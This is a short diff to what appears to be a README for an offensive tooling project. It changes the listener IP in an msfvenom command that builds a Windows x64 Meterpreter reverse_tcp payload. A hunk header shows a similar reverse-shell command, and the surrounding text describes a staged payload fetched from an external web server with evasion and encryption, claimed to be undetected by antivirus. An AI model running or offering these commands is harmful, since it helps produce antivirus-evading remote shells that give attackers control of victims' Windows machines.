@@ -130,7 +130,7 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.21 -o /opt/Offensive-G
 
 - Meterpreter Staged Payload downladed from external web server with Evasion and Encryption Module implemented. **(UPDATE: Not detected by AV as of 23/05/2024)**
 ```
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.134 -o /tmp/payload.txt -b "\x00" EXITFUNC=thread LPORT=443 -f c
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.145 -o /tmp/payload.txt -b "\x00" EXITFUNC=thread LPORT=443 -f c
 ```
 ![](https://i.imgur.com/fwoBcKS.png)
 
